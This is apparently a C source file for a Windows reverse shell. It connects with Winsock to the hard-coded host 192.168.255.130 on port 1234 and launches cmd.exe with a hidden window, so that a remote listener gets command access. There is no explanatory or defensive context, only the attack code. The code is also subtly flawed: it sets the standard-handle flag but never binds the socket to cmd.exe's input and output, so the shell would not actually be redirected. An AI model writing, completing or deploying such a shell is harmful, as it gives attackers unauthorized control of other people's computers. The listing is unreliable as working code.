#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <ws2tcpip.h>

int main() {
    // Define the networking structure
    struct networking {
        WSADATA wsa;
        SOCKET shell;
        struct sockaddr_in address;
        char receiveserver[512];
        char ip_address[256];
        int port;
    };

    struct networking client;
    strcpy(client.ip_address, "192.168.255.130");
    client.port = 1234;

    // Define the process information structure
    struct process {
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
    };

    struct process process;

    // Initialize Winsock
    int result = WSAStartup(MAKEWORD(2, 2), &client.wsa);
    if (result != 0) {
        printf("WSAStartup failed with error: %d\n", result);
        return EXIT_FAILURE;
    }

    // Create the socket
    client.shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (client.shell == INVALID_SOCKET) {
        printf("WSASocket() failed with error: %d\n", WSAGetLastError());
        return EXIT_FAILURE;
    }

    // Set up the address struct
    client.address.sin_addr.s_addr = inet_addr(client.ip_address);
    client.address.sin_port = htons(client.port);
    client.address.sin_family = AF_INET;

    // Connect to the server
    int connection = WSAConnect(
        client.shell,
        (struct sockaddr *)&client.address,
        sizeof(client.address),
        NULL,
        NULL,
        NULL,
        NULL
        );

    if (connection == SOCKET_ERROR) {
        printf("WSAConnect() failed with error: %d\n", WSAGetLastError());
        return EXIT_FAILURE;
    }

    // Receive data from the server
    int receive = recv(
        client.shell,
        client.receiveserver,
        sizeof(client.receiveserver),
        0
        );

    if (receive == SOCKET_ERROR) {
        printf("WSARecv() failed with error: %d\n", WSAGetLastError());
    }

    memset(&process.si, 0, sizeof(process.si));

    process.si.cb = sizeof(process.si);
    process.si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);

    result = CreateProcessA(
        "C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        TRUE,
        0, NULL,
        NULL,
        &process.si,
        &process.pi);


    if (result == 0) {
        printf("CreateProcessA() failed %d", GetLastError());
        return 1;
    }

    DWORD end = WaitForSingleObject(
        process.pi.hProcess,
        INFINITE
        );

    if (end == WAIT_FAILED) {
        printf("WaitForSingleObject() failed %d", GetLastError());
        return 1;
    }

    // Close process handles
    CloseHandle(process.pi.hProcess);
    CloseHandle(process.pi.hThread);

    // Cleanup Winsock
    closesocket(client.shell);
    WSACleanup();

    return EXIT_SUCCESS;
}
